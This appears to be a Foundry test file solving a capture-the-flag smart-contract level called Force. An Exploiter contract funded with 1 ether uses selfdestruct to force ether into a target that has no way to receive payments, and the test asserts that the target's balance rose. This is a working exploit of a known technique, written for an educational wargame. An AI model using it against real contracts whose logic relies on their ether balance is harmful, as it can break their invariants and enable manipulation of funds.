pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/08.sol";

contract Exploiter {

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function exploit(address instance) external payable {
        selfdestruct(payable(instance));
    }

    receive() external payable { }
}

contract Test08 is Test {

    address user = address(0x1);
    Force instance;
    
    function setUp() public {
        instance = new Force();
        vm.deal(user, 1 ether);
    }

    function testSolve() public {
        Exploiter exploiter = new Exploiter{value: 1 ether}();
        
        uint256 previousBalance = address(instance).balance;
        console.log("Previous Balance: ", previousBalance);

        exploiter.exploit(address(instance));

        uint256 newBalance = address(instance).balance;
        console.log("New Balance: ", newBalance);

        assertGt(newBalance, previousBalance);
    }

}